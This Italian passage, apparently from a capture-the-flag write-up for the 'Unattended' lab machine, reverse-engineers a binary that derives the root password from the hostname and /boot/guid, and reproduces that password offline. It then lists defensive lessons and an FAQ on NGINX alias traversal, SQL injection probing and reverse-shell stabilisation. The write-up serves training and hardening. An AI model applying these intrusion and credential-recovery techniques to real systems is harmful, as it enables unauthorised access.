**`local_18 = FUN_00417c60("/etc/hostname",&DAT_0049e344);`** — `DAT_0049e344` è quel singolo byte visto prima nella finestra delle stringhe, valore `72h`, cioè il carattere `"r"`. Questa chiamata, quindi, è nella forma "apri questo file in modalità lettura" — esattamente il comportamento della funzione standard C `fopen()`. Ghidra non conosce il nome originale (rimosso dallo stripping), quindi lo mostra con un nome generico come `FUN_00417c60`, ma il comportamento coincide.

**`if (local_18 != 0) { ... }`** — `fopen()` restituisce 0 (NULL) se l'apertura fallisce. Questo controllo dice: "solo se il file è stato aperto con successo, procedi a leggerlo".

**`lVar3 = FUN_00417980(&local_518,1000,local_18);`** — legge fino a 1000 byte dal file appena aperto (`local_18`) e li scrive dentro `local_518`, sovrascrivendo il "TEST" iniziale col contenuto vero di `/etc/hostname`. Questo è il comportamento di `fread()`. Il valore `1000` è un limite di sicurezza: legge al massimo 1000 byte, non di più — è proprio questo genere di limite esplicito, assente in funzioni come `strcpy()` o `gets()`, a impedire un buffer overflow in questo punto.

**`FUN_00400fde(&local_518);`** — chiamata su ciò che è stato appena letto. Aprendo questa funzione separatamente, il suo codice è:

```c
void FUN_00400fde(char *param_1)
{
    char *local_20;
    char *local_10;

    local_20 = param_1;
    local_10 = param_1;
    while (*local_20 != '\0') {
        if ((*local_20 == '\t') || (*local_20 == '\n')) {
            local_20 = local_20 + 1;
        }
        else {
            *local_10 = *local_20;
            local_20 = local_20 + 1;
            local_10 = local_10 + 1;
        }
    }
    *local_10 = '\0';
}
```

In pratica, questa funzione scorre il testo carattere per carattere e **rimuove tabulazioni (`\t`) e ritorni a capo (`\n`)**, ricompattando il resto — è una pulizia tipica per un contenuto letto da un file, che spesso porta con sé un ritorno a capo finale indesiderato prima di essere usato in un calcolo. Viene usata due volte: una sull'hostname appena letto, una sul contenuto di `/boot/guid` più avanti nella funzione.

**`FUN_00417590(local_18);`** — a questo punto il contenuto del file è già stato letto e ripulito, quindi il file viene chiuso: comportamento di `fclose()`.

La stessa identica sequenza (`fopen` → controllo di successo → `fread` fino a un limite → pulizia caratteri → `fclose`) si ripete subito dopo per `/boot/guid`, ma con una differenza cruciale nel controllo:

```c
local_18 = FUN_00417c60("/boot/guid",&DAT_0049e344);
if (local_18 == 0) {
    FUN_00417200("supercazzola");
}
else {
    lVar3 = FUN_00417980(local_908,1000,local_18);
    if (lVar3 != 0) {
        FUN_00400fde(local_908);
    }
    FUN_00417590(local_18);
    /* ... concatenazione con "antani" e calcolo hash ... */
}
```

Qui il controllo è invertito rispetto a `/etc/hostname`: se `local_18 == 0` (cioè `fopen()` è fallita perché il file non esiste), il programma stampa direttamente `"supercazzola"` e si ferma — non entra nel ramo `else` dove avviene tutto il resto (concatenazione con `antani` e calcolo dell'hash finale). Questo spiega perché eseguendo il binario su un Kali qualsiasi, dove `/boot/guid` semplicemente non esiste, il risultato è sempre "supercazzola": manca l'ingrediente che fa scattare il calcolo vero.

Per verificarlo concretamente, basta creare il file a mano e osservare il cambio di comportamento:

```bash
./uinitrd c0m3s3f0ss34nt4n1
# supercazzola

sudo touch /boot/guid
./uinitrd c0m3s3f0ss34nt4n1
# 46b8c9f88086afb0982f52376efe925928e6b8f  (hash calcolato, ma con contenuto vuoto/sbagliato)
```

Anche solo creando il file vuoto, il comportamento cambia — smette di stampare "supercazzola" e produce un hash, per quanto ancora sbagliato (perché il contenuto non è quello giusto). Questo conferma sperimentalmente, senza dubbi, che è proprio la condizione `local_18 == 0` a decidere quale dei due rami viene eseguito.

### Verifica sperimentale

A questo punto, invece di fidarsi solo della lettura del codice, ha senso verificare il comportamento sperimentalmente: creando a mano gli stessi file su una macchina Kali, con lo stesso contenuto trovato su Unattended, e osservando se il binario produce davvero la stessa password.

```bash
echo -n 'unattended' > /etc/hostname
echo -n 'C0B604A4-FE6D-4C14-A791-BEB3769F3FBA' > /boot/guid
./uinitrd c0m3s3f0ss34nt4n1
```

Il risultato è, byte per byte, identico alla password root ottenuta sulla macchina reale: `132f93ab100671dcb263acaf5dc95d8260e8b7c6`. Questo conferma sperimentalmente tutta la catena di ragionamento fatta leggendo il codice decompilato: hostname e GUID sono davvero gli unici due "ingredienti" variabili nel calcolo, e conoscendoli si può ricostruire la password offline, senza mai dover eseguire il binario direttamente sul target.

Questo esercizio, oltre a essere un buon allenamento di reverse engineering, mette in luce un principio difensivo concreto: **derivare una password da valori parzialmente prevedibili e hardcodati in un binario distribuito con il sistema è rischioso**. Chiunque ottenga accesso in lettura a quel binario — qui, per via di un permesso di gruppo mal configurato — può, con tempo e pazienza, ricostruire l'intera logica e calcolare la password autonomamente, senza mai doverla "rubare" direttamente.

## Lezioni difensive

Alcuni punti concreti che, sul lato blue team, avrebbero interrotto questa catena d'attacco in più punti:

* **Configurazione alias NGINX**: verificare sempre che ogni `alias` in location NGINX termini con slash, oppure preferire `root` invece di `alias` dove possibile, per evitare l'off-by-slash di Orange Tsai.
* **Validazione input lato server**: `intval($x) == $x` non è un controllo di tipo sicuro in PHP — va sempre usato `===`, oppure una validazione esplicita con `preg_match` su un pattern numerico rigoroso.
* **Query parametrizzate**: l'intera catena di SQL injection sarebbe stata impossibile con prepared statement invece di concatenazione di stringhe.
* **Whitelist sui dati di sessione**: popolare `$_SESSION` da `$_COOKIE` senza controllo su chiavi e contenuto è equivalente a dare scrittura arbitraria sul file di sessione lato server.
* **Permessi di gruppo sui file di boot**: un gruppo custom con accesso in lettura a file `initrd` (o qualunque asset riservato a root) andrebbe sempre valutato con sospetto in fase di hardening.
* **Nessun segreto hardcoded in binari distribuiti**, specialmente se quei binari finiscono per errore in path leggibili da utenti non privilegiati.

## FAQ

**La tecnica dell'alias NGINX è una CVE specifica?**
No. È un problema di configurazione (alias senza slash finale), non un bug in una versione specifica di NGINX. È diverso, ad esempio, da CVE-2021-41773/CVE-2021-42013, che sono difetti di path normalization interni ad Apache HTTP Server 2.4.49/2.4.50.

**Perché `%2e` produce lo stesso risultato di `..`?**
Perché `%2e` è semplicemente la codifica URL del carattere punto (`.`). NGINX decodifica la richiesta prima di valutare la location, quindi `dev.%2e/` e `dev../` sono trattati in modo identico.

**Serve sempre un cron job per sfruttare un campo di configurazione come `checkrelease`?**
In questo caso sì — il valore da solo nel database non farebbe nulla; è l'esecuzione periodica lato sistema (probabilmente un cron o un timer) a renderlo un vettore di code execution. Prima di sfruttarlo conviene sempre osservare se il valore viene "resettato" nel tempo, segno che qualcosa lo sta rileggendo ed eseguendo.

**Perché aggiungere un semplice apice (`'`) all'URL basta per notare la SQL injection?**
Perché nel codice il valore che scrivi nell'URL viene incollato dentro una query SQL tra due apici. Se il sito non lo "pulisce" prima di usarlo, il tuo apice extra rompe la sintassi della query — e osservando come il sito reagisce a quella rottura (errore, pagina diversa, comportamento anomalo) puoi capire se il parametro è vulnerabile, ancora prima di leggere una riga di codice sorgente.

**Un file `.img` è sempre legato al boot del sistema?**
No, `.img` è solo un'estensione generica per "immagine di un filesystem" — puoi trovarla per DVD virtuali, backup di dischi, immagini di sistemi embedded, e altro. In questo caso specifico si tratta di un initrd, cioè un'immagine usata proprio nella fase di avvio, ma il formato in sé non implica automaticamente quel contesto.

**Perché `hidepid=2` rende inutile `pspy`?**
Perché `pspy` si basa sulla lettura di `/proc` per osservare i processi in esecuzione di altri utenti. Con `hidepid=2`, il kernel nasconde le informazioni sui processi non appartenenti all'utente corrente, quindi anche uno strumento come `pspy` vede solo i propri processi.

**Meglio Python o `socat` per stabilizzare la shell?**
Dipende da cosa è disponibile sul target: vanno sempre verificati entrambi prima di scegliere. Se Python è presente, il classico one-liner con `pty.spawn` è comodo e ben noto. Se manca (come capita più spesso di quanto si pensi su ambienti minimali), `socat` è un'alternativa altrettanto valida — a patto che sia installato — e ha il vantaggio di gestire nativamente una pty completa senza dover fare passaggi aggiuntivi come `stty raw -echo`.
